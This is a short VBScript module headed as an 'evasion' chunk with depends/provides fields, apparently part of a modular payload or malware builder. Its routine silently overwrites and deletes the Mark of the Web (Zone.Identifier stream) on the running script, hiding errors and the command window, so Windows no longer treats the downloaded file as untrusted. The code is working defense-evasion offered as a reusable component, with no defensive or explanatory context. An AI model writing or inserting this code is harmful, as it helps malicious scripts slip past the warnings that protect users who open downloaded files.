' chunk: evasion/motw_strip
' depends: (none)
' provides: strip_motw
' format: vbscript
' note: Remove Mark of the Web Zone.Identifier ADS from file

Sub strip_motw()
    On Error Resume Next
    Dim fso, sh, scriptPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set sh = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    Dim adsPath
    adsPath = scriptPath & ":Zone.Identifier"
    If fso.FileExists(scriptPath) Then
        sh.Run "cmd.exe /c echo. > """ & adsPath & """", 0, True
        fso.DeleteFile adsPath, True
    End If
End Sub
